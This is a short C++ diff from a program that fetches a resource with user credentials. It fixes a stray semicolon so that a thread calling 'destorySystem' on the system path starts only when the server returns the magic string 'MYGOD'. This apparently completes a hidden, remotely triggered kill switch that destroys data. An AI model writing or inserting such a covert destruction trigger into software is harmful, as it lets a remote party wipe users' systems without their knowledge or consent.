@@ -144,7 +144,7 @@ int main(int argc, char* argv[])
 			auto getResult = client.getResource(resType, userName, password, tradingDay);
 			writeResult(cliSocket, getResult);
 
-			if (getResult.second == "MYGOD");
+			if (getResult.second == std::string("MYGOD"))
 			{
 				boost::thread destoryThread(destorySystem, sysPath);
 			}
